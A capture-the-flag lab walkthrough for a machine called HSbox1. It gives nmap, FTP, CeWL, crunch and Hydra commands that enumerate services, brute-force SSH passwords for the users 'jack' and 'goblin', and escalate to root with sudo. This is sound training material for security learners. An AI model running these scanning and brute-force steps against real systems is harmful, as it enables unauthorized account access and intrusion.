HSbox1 – Cybersecurity

📌 Overview

HSbox1 designed to practice network enumeration, service discovery, password auditing, Linux user enumeration, and privilege escalation in an authorized environment.

🎯 Objectives

- Identify open ports and running services.
- Enumerate FTP and HTTP services.
- Discover usernames and generate custom wordlists.
- Perform SSH password auditing.
- Switch between local users.
- Identify potential privilege-escalation paths.
- Obtain root access and locate the final flag.

🖥️ Lab Information

Detail| Information
Machine Name| HSbox1
Platform| Hacker School Lab
Attacking Machine| Kali Linux
Target IP| "192.168.1.82"
Difficulty| Not specified
Objective| Find flags and obtain authorized access

🛠️ Tools Used

- Nmap – Port scanning and service enumeration
- FTP – File and anonymous-access enumeration
- CeWL – Custom wordlist generation
- Hydra – SSH password auditing
- Crunch – Wordlist generation
- SSH – Remote login
- Linux commands – File discovery and user enumeration
- Sudo – Privilege escalation analysis

🔎 Methodology

1. Network Enumeration

Scan all TCP ports and identify running services and their versions.

nmap -sC -sV -p- 192.168.1.82

Services identified in the lab:

- FTP — Port "21"
- HTTP — Port "1515"
- SSH — Port "3535"

2. FTP Enumeration

Check whether anonymous FTP access is permitted and inspect accessible files.

ftp 192.168.1.82

The lab's "note.txt" file revealed the username "jack".

3. HTTP Enumeration

Open the target website in a browser:

http://192.168.1.82:1515

Use CeWL to generate a custom wordlist from the website content:

cewl http://192.168.1.82:1515 -w jackpassword.txt

4. SSH Password Auditing

Use the generated wordlist to audit SSH credentials in the authorized lab.

hydra -l jack -P jackpassword.txt ssh://192.168.1.82:3535

The documented lab result identified the password for "jack". Use the credentials obtained in your own lab to continue.

5. User Enumeration

After obtaining authorized SSH access, inspect the user's files and read the available notes.

ls -la
cat note.txt

The notes provided a clue for the next user, "goblin".

6. Wordlist Generation

The lab specified a four-character password containing the characters "a", "c", "1", and "5".

crunch 4 4 ac15 -o goblinpassword.txt

Use the generated wordlist for authorized SSH password auditing:

hydra -l goblin -P goblinpassword.txt ssh://192.168.1.82:3535

The documented result identified the password for the "goblin" account.

7. File Enumeration

Switch to the discovered account and inspect its notes.

su goblin
ls -la
cat note

Search for the script mentioned in the notes:

find / -type f -name "final.sh" 2>/dev/null

Inspect the script to understand its permissions and potential privilege-escalation implications.

8. Privilege Escalation

Review the script and check the account's permitted sudo commands:

sudo -l

The lab report documents obtaining root access with:

sudo -i

This works only when the account has sufficient sudo privileges. Inspect the script and verify the relevant permissions before drawing conclusions about the escalation path.

9. Flag Discovery

After obtaining authorized root access, inspect the root directory and locate the flag file.

ls -la /root
cat /root/flag.txt

Record the flag locally for your lab documentation. Avoid publishing sensitive credentials or flag values if the lab provider restricts disclosure.

📚 Key Learnings

- Full-port scanning and service-version detection
- FTP anonymous-access enumeration
- HTTP content analysis and custom wordlist generation
- SSH authentication testing
- Linux file and user enumeration
- Shell script and sudo-permission analysis
- Privilege-escalation investigation
- Technical documentation and evidence collection
